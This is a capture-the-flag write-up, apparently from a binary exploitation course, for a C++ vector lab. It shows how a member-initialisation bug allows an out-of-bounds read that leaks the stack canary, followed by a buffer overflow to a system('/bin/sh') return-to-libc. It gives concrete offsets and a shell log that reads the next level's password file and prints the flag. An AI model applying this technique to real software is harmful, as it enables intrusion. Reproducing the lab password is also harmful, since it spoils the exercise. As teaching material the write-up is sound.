## lab9C

Our first ```C++``` lab!

We have a class template here:

```cpp
template <class T>
class DSVector {
    public:
                     // I don't like indexing from 0, I learned VB.NET first.
        DSVector() : len(1), alloc_len(len+256) {}
        unsigned int size() { return len; }
        void append(T item);
                                            // No info leaks, either!
        T get(unsigned int index) { return (index < alloc_len ? vector_data[index] : -1); };
    private:
        unsigned int alloc_len;
        unsigned int len;
        // I was asleep during the dynamic sizing part, at least you can't overflow!
        T vector_data[1+256];
};

template <class T>
void
DSVector<T>::append(T item)
{
    // No overflow for you!
    if (len >= alloc_len) {
        std::cout << "Vector is full!" << std::endl;
        return;
    }
    vector_data[this->len++] = item;
}
```

In ```main``` we see that we initialize an ```int vector``` of that class:

```cpp
DSVector test1;
```

So we can ```append``` an item to the ```stack``` or ```read``` one of the items by specifying its ```indexes```. Unlike a previous challenge, we cannot input a negative index to read off the stack because

```cpp
index < alloc_len ? vector_data[index] : -1);
```

is executed in memory as an ```unsigned comparison```. How are we to pwn this? Looking at ```checksec```:

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

We also have to get the value of ```canary```. Since ```test1.get()``` is the only function that gives us back information, we have to look for ways we can use it to have an ```information leak```, which means we have to somehow pass the check.

The check involves the value of ```alloc_len```. We can see that, in code, it was initialized kinda goofy. What turns out in reality is that ```alloc_len``` was initialized AFTER ```len```, which means it was set incorrectly, which allows us to read indexes beyond the limits of the buffer.

With this in mind we can easily read the value of the ```canary``` and, using the value of ```ret```, we can find the addresses of ```system``` and a string ```"/bin/sh"```.

Now we simply have to overflow the buffer with calls to ```test1.append()```, which works because it passes the ```if check```:

```cpp
// No overflow for you!
if (len >= alloc_len) {
  std::cout << "Vector is full!" << std::endl;
      return;
}
vector_data[this->len++] = item;
```

```
canary is at vector_data[257]
ret is at vector_data[261]
system is at ret + 0x2670d
string is at ret + 0x146fa1
```

```bash
+------- DSVector Test Menu -------+
| 1. Append item                   |
| 2. Read item                     |
| 3. Quit                          |
+----------------------------------+
Enter choice:
+------- DSVector Test Menu -------+
| 1. Append item                   |
| 2. Read item                     |
| 3. Quit                          |
+----------------------------------+
Enter choice:
+------- DSVector Test Menu -------+
| 1. Append item                   |
| 2. Read item                     |
| 3. Quit                          |
+----------------------------------+
Enter choice:
+------- DSVector Test Menu -------+
| 1. Append item                   |
| 2. Read item                     |
| 3. Quit                          |
+----------------------------------+
Enter choice: $ whoami
lab9A
$ cat /home/lab9A/.pass
1_th0uGht_th4t_w4rn1ng_wa5_l4m3
```
